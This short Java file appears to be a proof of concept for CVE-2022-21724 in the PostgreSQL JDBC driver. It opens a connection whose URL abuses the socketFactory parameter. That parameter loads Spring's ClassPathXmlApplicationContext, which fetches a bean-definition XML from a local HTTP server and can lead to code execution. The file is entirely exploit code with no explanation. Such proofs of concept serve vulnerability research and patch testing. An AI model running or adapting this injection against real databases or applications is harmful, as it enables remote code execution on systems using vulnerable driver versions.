package postgresql;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;


public class CVE_2022_21724 {
    public static void main(String[] args) throws SQLException, ClassNotFoundException {

        Class.forName("org.postgresql.Driver");
        String str = "jdbc:postgresql://127.0.0.1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:8000/cve_2022_21724.xml";
        DriverManager.getConnection(str);

    }
}



